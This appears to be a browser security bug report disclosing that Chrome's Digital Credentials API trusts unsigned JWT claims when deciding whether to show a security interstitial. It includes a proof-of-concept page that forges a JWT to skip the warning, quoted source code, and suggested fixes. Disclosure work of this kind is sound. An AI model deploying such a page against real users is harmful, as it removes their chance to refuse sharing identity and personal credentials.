# VRP Report: Digital Credentials API Interstitial Bypass via Unsigned JWT

## Title

Digital Credentials API bypasses security interstitial by parsing JWT claims without verifying signature — attacker-controlled interstitial decisions

## Severity

High (Security interstitial bypass, no compromised renderer, feature enabled by default)

## Component

Blink > Identity > DigitalCredentials

## Chrome Version

Tested against Chromium source at HEAD (April 2026). Affects all Chrome versions with Digital Credentials API enabled.

## Summary

The Digital Credentials API (`navigator.credentials.get({digital: ...})`) includes a security interstitial that warns users when a relying party (RP) requests sensitive personal information. The interstitial decision is based on parsing the JWT payload in the request, but the JWT's cryptographic signature is never verified. A malicious RP can forge a JWT with benign-looking claims to bypass the interstitial, then use the actual credential request to harvest sensitive data.

## Steps to Reproduce

### Step 1: Set up malicious RP page

```html
<!-- https://evil-rp.example/request-credential.html -->
<button id="btn">Verify Age</button>
<script>
document.getElementById('btn').addEventListener('click', async () => {
  // Forge a JWT with only "age_over_21" in the claims
  // The signature is fake but Chrome doesn't verify it
  const forgedHeader = btoa(JSON.stringify({"alg":"RS256","typ":"JWT"}));
  const forgedPayload = btoa(JSON.stringify({
    "response_type": "vp_token",
    "presentation_definition": {
      "input_descriptors": [{
        "id": "age_check",
        "constraints": {
          "fields": [{
            "path": ["$.age_over_21"]
          }]
        }
      }]
    }
  }));
  const forgedJwt = `${forgedHeader}.${forgedPayload}.FAKE_SIGNATURE`;

  try {
    const credential = await navigator.credentials.get({
      digital: {
        requests: [{
          protocol: "openid4vp",
          data: {
            // The JWT bypasses the interstitial check
            request: forgedJwt,
            // But the actual request intent could be different
            client_id: "evil-rp.example",
            nonce: "attacker-nonce"
          }
        }]
      }
    });
    
    // Credential received without interstitial warning!
    console.log('Got credential:', credential);
  } catch (e) {
    console.error(e);
  }
});
</script>
```

### Step 2: Observe no interstitial

When the user clicks the button, Chrome should show a security interstitial warning about the credential request. Instead, because the forged JWT claims only `age_over_21`, Chrome's interstitial logic sees it as a low-risk request and skips the warning.

## Root Cause

```cpp
// content/browser/digital_credentials/digital_identity_request_impl.cc:251-282
bool CanRequestCredentialBypassInterstitialForOpenid4vpProtocol(
    const base::Value& request) {
  const base::Value::Dict* request_dict = request.GetIfDict();
  
  // If the request contains a JWT, parse its payload
  if (const std::string* jwt_str = request_dict->FindString("request")) {
    std::optional<base::ListValue> parsed_jwt = sdjwt::Jwt::Parse(*jwt_str);
    // ⚠️ Jwt::Parse() only splits and base64-decodes
    // ⚠️ NO signature verification is performed
    // ⚠️ The forged claims are trusted for the interstitial decision
    
    auto jwt = sdjwt::Jwt::From((*parsed_jwt)[0]);
    payload = base::JSONReader::Read(jwt->payload.value(), ...);
    request_dict = &payload->GetDict();  // Use forged claims
  }
  
  // Decision is made on unverified claims
  return CheckClaimsAreAllowlisted(request_dict);
}
```

The `Jwt::Parse()` function at `sd_jwt.cc:550` only performs structural parsing (split by `.`, base64-decode) and explicitly lacks signature verification:
```cpp
// sd_jwt.cc:550-551
// TODO: implement the validations described here:
//   https://www.rfc-editor.org/rfc/rfc7519.html#section-7.2
```

## Expected Result

Either:
1. JWT signatures should be verified before trusting claims for security decisions, OR
2. The interstitial should always be shown when the request contains a JWT (since the claims can't be trusted), OR
3. The interstitial decision should be based on the full request parameters, not just the JWT payload

## Actual Result

The JWT payload is trusted without signature verification. A forged JWT with benign claims bypasses the interstitial.

## Security Impact

1. **Interstitial bypass**: The security interstitial is the primary user-facing warning for sensitive credential requests. Bypassing it removes the user's opportunity to reject the request.
2. **Credential harvesting**: Without the interstitial, users may unknowingly share sensitive credentials (ID documents, payment information, personal data).
3. **No compromised renderer required**: The RP controls the request content, including the JWT.
4. **Feature enabled by default**: `kWebIdentityDigitalCredentials` is enabled by default in Chrome.
5. **Trust boundary violation**: Chrome makes a security decision (show interstitial or not) based on attacker-controlled, unverified data.

## Suggested Fix

Option A: Verify JWT signature before using claims for interstitial decisions.
Option B: Always show interstitial when the request contains a JWT (conservative approach until signature verification is implemented).
Option C: Don't use JWT payload for interstitial decisions — use the outer request parameters instead.

## PoC

Inline above. The key observation: `Jwt::Parse()` at `sd_jwt.cc:550` doesn't verify signatures, and the interstitial logic trusts the parsed claims.
